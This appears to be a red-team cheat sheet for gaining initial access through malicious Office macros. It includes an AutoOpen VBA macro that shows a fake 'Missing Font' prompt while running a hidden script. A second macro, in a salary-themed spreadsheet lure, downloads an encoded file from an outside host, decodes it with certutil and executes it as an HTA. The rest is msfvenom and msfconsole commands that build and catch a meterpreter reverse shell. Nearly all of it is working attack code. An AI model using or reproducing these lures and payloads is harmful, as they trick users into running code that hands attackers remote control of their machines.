# MACRO Attack

simple macro 

```
Sub AutoOpen()
    Nooranet
End Sub
Sub Nooranet()
  MsgBox "Download Missing Font Automatic", vbOKOnly, "Missing Font"
  a = Shell("E:\Intial-Access\Macro\screen.cmd", vbHide)
End Sub
```

salaray-1401.xslm

```powershell
```powershell
Sub Auto_Open()
    DownloadAndExec
End Sub
Sub DownloadAndExec()
Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "http://nooranetred.com/edr.cert", False
xHttp.Send
With bStrm
.Type = 1 '//binary
.Open
.write xHttp.responseBody
.savetofile "edr.cert", 2 '//overwrite
End With
Shell ("cmd /c certutil -decode edr.cert edr.hta & start edr.hta")
End Sub
```
```

#### payload

```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.46 LPORT=443 -f hta-psk -o /var/www/html/cert.hta
```

##### 

##### Encode payload

```powershell
$raw = Get-Content -path cert.hta -Encoding Byte
$b64 =[system.Convert]::TOBase64String($raw)
$b64  | Out-File E:\Initial-Access\Macro\edr.cert
```

#### listener

```bash
msfconsole -x "use exploits/multi/handler; set lhost 192.168.1.46; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
```


